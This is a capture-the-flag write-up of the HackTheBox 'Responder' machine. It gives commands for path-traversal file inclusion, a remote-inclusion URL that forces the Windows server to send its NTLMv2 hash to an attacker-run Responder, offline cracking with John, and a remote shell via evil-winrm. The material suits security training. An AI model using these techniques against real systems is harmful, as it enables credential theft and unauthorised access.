Responder

HackTheBox · Very Easy by Brenno M.

Responder exploits a file inclusion (LFI/RFI) in a PHP app to force the Windows server to authenticate against an attacker-controlled machine, capturing an NTLMv2 hash that, once cracked, grants access via WinRM.

Reconnaissance

Nmap reveals HTTP (80) and WinRM (5985). Add the unika.htb domain to /etc/hosts.

nmap -p- --min-rate 1000 -sV <IP>
echo "<IP> unika.htb" | sudo tee -a /etc/hosts

LFI → RFI

The page parameter is vulnerable to file inclusion. We confirm LFI, then test remote inclusion (RFI) pointing at the attacker host.

http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
http://unika.htb/index.php?page=//<MY_IP>/somefile

Hash capture with Responder

Start Responder on the VPN interface to listen for SMB requests. The RFI points at the attacker share, the server tries to authenticate and leaks an Administrator NTLMv2 hash.

sudo responder -I tun0
http://unika.htb/index.php?page=//<MY_IP>/whatever
# [SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:<NTLMv2_HASH_OMITTED>

Cracking and access

The hash is saved and cracked offline with John (rockyou). With the recovered password, evil-winrm returns a shell and the flag is read.

john -w=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i <IP> -u administrator -p '<PASSWORD>'
type C:\Users\mike\Desktop\flag.txt
